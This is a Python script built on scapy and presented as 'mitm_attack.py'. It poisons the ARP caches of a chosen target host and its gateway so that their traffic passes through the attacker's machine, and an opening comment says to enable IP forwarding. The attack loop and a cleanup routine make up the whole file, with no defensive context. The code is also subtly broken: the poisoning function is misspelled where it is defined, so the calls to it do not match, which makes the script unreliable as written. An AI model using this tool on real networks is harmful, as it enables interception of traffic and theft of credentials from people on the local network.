# type the below command in the attacker machine
# echo 1 > /proc/sys/net/ipv4/ip_forward
# it activates ip forwarding

#usage example: sudo python3 mitm_attack.py -t 192.168.168.11 -g 192.168.168.1

import scapy.all as scapy
import time
import optparse

def get_mac_address(ip):
    #it returns a mac address for a given IP address
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    my_packet = broadcast_packet / arp_request_packet
    answered_list, _ = scapy.srp(my_packet, timeout = 3, verbose=False)
  
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None


def arp_poisoining(target_ip, poisoned_ip):
    target_mac = get_mac_address(target_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip)
    scapy.send(arp_response, verbose=False) 
    #scapy.ls()


def reset_operation(fooled_ip,gateway_ip):

    fooled_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)

    arp_response = scapy.ARP(op=2,pdst=fooled_ip,hwdst=fooled_mac,psrc=gateway_ip,hwsrc=gateway_mac)
    scapy.send(arp_response,verbose=False,count=10)


def get_user_input():
    parse_object = optparse.OptionParser()

    parse_object.add_option("-t", "--target",dest="target_ip",help="Enter Target IP")
    parse_object.add_option("-g","--gateway",dest="gateway_ip",help="Enter Gateway IP")

    options = parse_object.parse_args()[0]

    if not options.target_ip:
        print("Enter Target IP")

    if not options.gateway_ip:
        print("Enter Gateway IP")

    return options

user_ips = get_user_input()
user_target_ip = user_ips.target_ip
user_gateway_ip = user_ips.gateway_ip


try:
    while True:
        arp_poisoning(user_target_ip,user_gateway_ip)
        arp_poisoning(user_gateway_ip,user_target_ip)
        time.sleep(3)
        print("\rSending packets", end="")

except KeyboardInterrupt:
    print("Quit & Reset")
    reset_operation(user_target_ip,user_gateway_ip)
    reset_operation(user_gateway_ip,user_target_ip)
